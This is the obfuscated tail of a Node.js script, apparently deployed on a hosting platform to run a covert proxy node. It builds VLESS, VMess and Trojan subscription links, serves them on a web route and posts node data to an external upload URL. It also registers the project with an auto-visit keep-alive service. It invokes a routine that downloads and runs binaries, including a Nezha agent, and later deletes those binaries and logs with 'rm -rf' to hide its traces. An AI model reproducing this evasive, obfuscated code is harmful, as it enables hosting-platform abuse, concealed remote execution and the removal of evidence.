_0xee5a19={_0x5cc605:0x24a,_0x53bc3f:0x20c},_0x1f1faa=_0x103d,_0xbbbfd8={'v':'2','ps':''+_0x5dfb59,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1f1faa(_0x56b8a9._0x10091d),'net':'ws','type':_0x1f1faa(_0x56b8a9._0x1486ec),'host':_0x349cbe,'path':_0x1f1faa(_0x56b8a9._0xe50d0b),'tls':_0x1f1faa(0x24c),'sni':_0x349cbe,'alpn':'','fp':_0x1f1faa(_0x56b8a9._0x192cf1)},_0x149b2e=_0x1f1faa(0x238)+UUID+'@'+CFIP+':'+CFPORT+_0x1f1faa(0x1fb)+_0x349cbe+'&fp=firefox&type=ws&host='+_0x349cbe+_0x1f1faa(0x255)+_0x5dfb59+_0x1f1faa(0x1de)+Buffer[_0x1f1faa(_0x56b8a9._0x58fef)](JSON[_0x1f1faa(0x1fd)](_0xbbbfd8))[_0x1f1faa(0x20e)](_0x1f1faa(_0x56b8a9._0x30ea8e))+_0x1f1faa(_0x56b8a9._0x181707)+UUID+'@'+CFIP+':'+CFPORT+_0x1f1faa(_0x56b8a9._0x161e44)+_0x349cbe+_0x1f1faa(0x251)+_0x349cbe+_0x1f1faa(_0x56b8a9._0x33c6dc)+_0x5dfb59+_0x1f1faa(0x235);console[_0x1f1faa(0x224)](Buffer[_0x1f1faa(_0x56b8a9._0x58fef)](_0x149b2e)[_0x1f1faa(_0x56b8a9._0x2a0f9f)]('base64')),fs[_0x1f1faa(_0x56b8a9._0x19e314)](subPath,Buffer['from'](_0x149b2e)['toString'](_0x1f1faa(_0x56b8a9._0x30ea8e))),console[_0x1f1faa(_0x56b8a9._0x112897)](FILE_PATH+_0x1f1faa(_0x56b8a9._0x23e6e5)),uploadNodes(),app[_0x1f1faa(0x207)]('/'+SUB_PATH,(_0x186f84,_0x381acb)=>{const _0x161ef1=_0x1f1faa,_0x1865a9=Buffer[_0x161ef1(0x201)](_0x149b2e)[_0x161ef1(0x20e)](_0x161ef1(_0xee5a19._0x5cc605));_0x381acb['set'](_0x161ef1(_0xee5a19._0x53bc3f),_0x161ef1(0x261)),_0x381acb[_0x161ef1(0x1c4)](_0x1865a9);}),_0xd17eca(_0x149b2e);},0x7d0);});}}async function uploadNodes(){const _0x290275={_0x5da21d:0x253,_0x234653:0x204,_0x59686b:0x246,_0x56b4e5:0x24d,_0x182a4e:0x1f5,_0x2e4aaa:0x25d,_0x38bfbd:0x223,_0x59fdaf:0x23b,_0x378994:0x26a},_0x38e544=_0x28dc2b;if(UPLOAD_URL&&PROJECT_URL){const _0x50ceb6=PROJECT_URL+'/'+SUB_PATH,_0x59b37d={'subscription':[_0x50ceb6]};try{const _0x482417=await axios[_0x38e544(_0x290275._0x5da21d)](UPLOAD_URL+'/api/add-subscriptions',_0x59b37d,{'headers':{'Content-Type':_0x38e544(0x23b)}});return _0x482417&&_0x482417['status']===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x482417):null;}catch(_0x345219){if(_0x345219[_0x38e544(0x204)]){if(_0x345219[_0x38e544(_0x290275._0x234653)][_0x38e544(0x26a)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x38e544(_0x290275._0x59686b)](listPath))return;const _0x422a16=fs[_0x38e544(_0x290275._0x56b4e5)](listPath,_0x38e544(0x1d3)),_0x230105=_0x422a16[_0x38e544(0x1c0)]('\x0a')[_0x38e544(_0x290275._0x182a4e)](_0x588cb3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x38e544(0x1f6)](_0x588cb3));if(_0x230105[_0x38e544(_0x290275._0x2e4aaa)]===0x0)return;const _0x290c23=JSON['stringify']({'nodes':_0x230105});try{const _0xdb25b=await axios[_0x38e544(0x253)](UPLOAD_URL+_0x38e544(_0x290275._0x38bfbd),_0x290c23,{'headers':{'Content-Type':_0x38e544(_0x290275._0x59fdaf)}});return _0xdb25b&&_0xdb25b[_0x38e544(_0x290275._0x378994)]===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0xdb25b):null;}catch(_0x150aa6){return null;}}else return;}}function cleanFiles(){const _0x57a759={_0x336aba:0x260,_0x10e5a7:0x1da,_0x132ae6:0x1e6},_0x3f2cfe={_0x8ecd52:0x1fa,_0x3d1c2e:0x1db};setTimeout(()=>{const _0x443d28={_0x4291ba:0x224,_0x390e20:0x1b1},_0x3db6a6=_0x103d,_0x1b11ec=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1b11ec[_0x3db6a6(0x265)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1b11ec['push'](phpPath);process[_0x3db6a6(_0x57a759._0x336aba)]===_0x3db6a6(_0x57a759._0x10e5a7)?exec(_0x3db6a6(0x1ea)+_0x1b11ec[_0x3db6a6(0x200)]('\x20')+_0x3db6a6(_0x57a759._0x132ae6),_0x2282b2=>{const _0x143868=_0x3db6a6;console[_0x143868(_0x3f2cfe._0x8ecd52)](),console[_0x143868(0x224)](_0x143868(0x1b1)),console['log'](_0x143868(_0x3f2cfe._0x3d1c2e));}):exec('rm\x20-rf\x20'+_0x1b11ec[_0x3db6a6(0x200)]('\x20')+_0x3db6a6(0x1f3),_0x3eb676=>{const _0x4610ed=_0x3db6a6;console[_0x4610ed(0x1fa)](),console[_0x4610ed(_0x443d28._0x4291ba)](_0x4610ed(_0x443d28._0x390e20)),console[_0x4610ed(0x224)](_0x4610ed(0x1db));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x45d607={_0x156b22:0x253,_0x475857:0x224,_0x187c06:0x1bd},_0x5e5807=_0x28dc2b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5e5807(0x224)](_0x5e5807(0x249));return;}try{const _0xb7eed8=await axios[_0x5e5807(_0x45d607._0x156b22)](_0x5e5807(0x1d5),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x5e5807(_0x45d607._0x475857)]('automatic\x20access\x20task\x20added\x20successfully'),_0xb7eed8;}catch(_0x3861b5){return console[_0x5e5807(0x243)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x3861b5[_0x5e5807(_0x45d607._0x187c06)]),null;}}async function startserver(){const _0x2ca54a=_0x28dc2b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x20bdf6){console[_0x2ca54a(0x243)](_0x2ca54a(0x1eb),_0x20bdf6);}}startserver()['catch'](_0x19aa50=>{const _0x39d568={_0x256cf0:0x1d9},_0x2a6d09=_0x28dc2b;console[_0x2a6d09(0x243)](_0x2a6d09(_0x39d568._0x256cf0),_0x19aa50);}),app[_0x28dc2b(0x22c)](PORT,()=>console['log'](_0x28dc2b(0x1f4)+PORT+'!'));
